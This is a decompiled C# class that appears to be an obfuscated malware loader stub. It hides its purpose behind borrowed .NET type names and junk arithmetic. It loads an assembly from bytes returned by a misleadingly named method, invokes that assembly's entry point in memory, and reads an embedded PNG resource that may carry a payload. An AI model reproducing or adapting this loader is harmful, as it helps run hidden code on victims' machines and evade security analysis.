using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

public class RowArrayList
{
	public static ImageFormat arizona = ImageFormat.get_Png();

	public static Assembly open = Assembly.Load(CompilerParameters.WrappedTransaction());

	public static MethodInfo mentry = Assembly.Load(CompilerParameters.WrappedTransaction()).EntryPoint;

	public static object XmlDataFeed(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(ChainPolicyParameter(entryPoint));
	}

	public static void MulticastNotSupportedException(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(XmlDataFeed(assembly, entryPoint), null);
	}

	public static string ChainPolicyParameter(MethodInfo entryPoint)
	{
		return (string)DeflateWrapperStream(entryPoint);
	}

	public static void SqlConnectionTimeoutErrorInternal()
	{
		TimerElapsedEventHandler();
	}

	internal static object DeflateWrapperStream(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool TimerElapsedEventHandler()
	{
		MulticastNotSupportedException(open, mentry);
		int num = Convert.ToInt32(-1685659228.0);
		if ((Convert.ToInt32(440255198.0515643 + Math.Tan(220127599.0)) ^ Convert.ToInt32(619476022.0 + Math.Ceiling(619476022.5))) == Convert.ToInt32(1407527603.0))
		{
			Convert.ToInt32(2.0 + Math.Log10(1.0));
			num += Convert.ToInt32(1685630197.4720604 + Math.Sqrt(842829614.5));
		}
		return (byte)num != 0;
	}

	internal static bool SQL()
	{
		int num = Convert.ToInt32(-591630889.0);
		if ((Convert.ToInt32(720946321.5 - Math.Abs(240315440.5)) ^ Convert.ToInt32(2034368596.2225761 + Math.Sin(1017184298.5))) == Convert.ToInt32(2564539470.0 - Math.Floor(854846490.0)))
		{
			Convert.ToInt32(3.0 - Math.Ceiling(1.0));
			num += Convert.ToInt32(591630908.5052463 - Math.Log(295815444.5));
		}
		return (byte)num != 0;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("CommonAce.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
